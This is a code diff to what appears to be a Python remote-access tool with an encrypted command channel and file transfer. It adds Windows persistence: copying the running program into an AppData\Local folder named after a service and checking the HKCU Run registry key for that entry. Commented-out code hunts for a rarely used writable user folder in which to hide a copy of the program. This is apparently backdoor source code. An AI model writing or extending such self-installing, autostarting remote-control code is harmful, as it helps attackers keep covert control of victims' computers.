@@ -3,8 +3,15 @@ from tools.cipher import *
 from tools.dictionary import *
 from tools.exception_handler import exception_handler
 from os.path import basename
+from shutil import copyfile
+from win32api import MoveFileEx
+import winreg
+import win32con
+import sys
 import time
 import json
+import os
+import random
 
 def packet_send(command, payload, cipherClass, conn, encrypt=True):
     delay = SEND_DELAY
@@ -91,7 +98,7 @@ def file_send(filename, sending_queue):
     start = True
     read_bytes = b''
     new_bytes = b''
-    action = "CREATE"
+    action = FTP_COMMAND_CREATE
 
     try:
         file = open(filename, "rb")
@@ -105,16 +112,16 @@ def file_send(filename, sending_queue):
 
             if (count*BYTES_TO_READ >= MAX_BYTES_PER_PACKET or new_bytes == b''):
                 count = 0
-                action = "CREATE" if start == True else "APPEND"
+                action = FTP_COMMAND_CREATE if start == True else FTP_COMMAND_APPEND
                 start = False
 
                 ftp_payload = {}
-                ftp_payload["FNAME"] = filename
-                ftp_payload["ACT"] = action
-                ftp_payload["FILE"] = read_bytes.hex()
+                ftp_payload[FTP_PK_FILENAME] = filename
+                ftp_payload[FTP_PK_ACTION] = action
+                ftp_payload[FTP_PK_PAYLOAD] = read_bytes.hex()
 
                 packet = {}
-                packet[PK_COMMAND_FLAG] = "FTP"
+                packet[PK_COMMAND_FLAG] = COMMAND_FTP
                 packet[PK_PAYLOAD_FLAG] = ftp_payload
                 sending_queue.put(packet)
 
@@ -131,15 +138,15 @@ def file_send(filename, sending_queue):
 
 def file_recv(packet):
     ftp_payload = json.loads(packet[PK_PAYLOAD_FLAG])
-    filename = basename(ftp_payload["FNAME"])
+    filename = basename(ftp_payload[FTP_PK_FILENAME])
 
     try:
-        if ftp_payload["ACT"] == "CREATE":
+        if ftp_payload[FTP_PK_ACTION] == FTP_COMMAND_CREATE:
             file = open(filename, "wb")
         else:
             file = open(filename, "ab")
 
-        payload = bytes.fromhex(ftp_payload["FILE"])
+        payload = bytes.fromhex(ftp_payload[FTP_PK_PAYLOAD])
         file.write(payload)
         file.close()
         return True
@@ -148,3 +155,82 @@ def file_recv(packet):
         return False
     finally:
         file.close()
+
+# def is_writable(folder_name):
+#     try:
+#         print(folder_name)
+#         t_file_name = str(random.randint(1,1))
+
+#         with open(folder_name + "\\" + t_file_name, 'wb') as f:
+#             f.write(b' ')
+#         os.remove(t_file_name)
+#         print(folder_name)
+#         return True
+#     except Exception as e:
+#         return False
+
+def copy_transfer():
+    file_path = os.getcwd()
+    file_name = os.path.basename(sys.argv[0])
+
+    path = os.path.dirname(os.getenv('APPDATA')) +"\\Local\\{}".format(SERVICE_NAME)
+    try:
+        if os.path.exists(path) == False:
+            os.makedirs(path)
+        copyfile(os.getcwd()+"\\"+file_name, path +"\\"+file_name)
+        return path
+    except:
+        return False
+
+def check_key(key_path = os.path.dirname(os.getenv('APPDATA')) +"\\Local\\{}".format(SERVICE_NAME)):
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", access=winreg.KEY_READ)
+    try:
+        count = 0
+        while(True):
+            val, path, data_type = winreg.EnumValue(key, count)
+            if val == SERVICE_NAME:
+                return True
+            count += 1
+    except:
+        return False
+    finally:
+        winreg.CloseKey(key)
+
+    # file_path = os.getcwd()
+    # abs_path = "C:\\Users" #"C:\\Program Files (x86)"
+    # file_name = os.path.basename(sys.argv[0])
+
+    # chosen = None
+    # while(True):
+    #     for file in os.listdir(abs_path):
+    #         current_file = abs_path + "\\" + file
+
+    #         if (os.path.isdir(current_file) == True and is_writable(current_file) == True):
+    #             current_stats = os.stat(current_file)
+    #             if isinstance(chosen, dict) == False or (chosen['STATS'].st_atime > current_stats.st_atime):
+    #                 chosen = {}
+    #                 chosen['FILENAME'] = current_file
+    #                 chosen['STATS'] = current_stats
+
+
+    #     if chosen == None:
+    #         break
+
+    #     abs_path = chosen['FILENAME']
+    #     chosen = None
+    # print(abs_path)
+
+    # try:
+    #     file = open(os.getcwd()+"\\"+file_name, "rb")
+    #     data = file.read()
+    #     file.close()
+
+    #     with open(abs_path+"\\"+file_name, "wb") as new_file:
+    #         new_file.write(data)
+
+    #     # copyfile(os.getcwd()+"\\"+file_name, abs_path+"\\"+file_name)
+    #     return True
+    # except Exception as e:
+    #     exception_handler(e)
+    #     return False
+
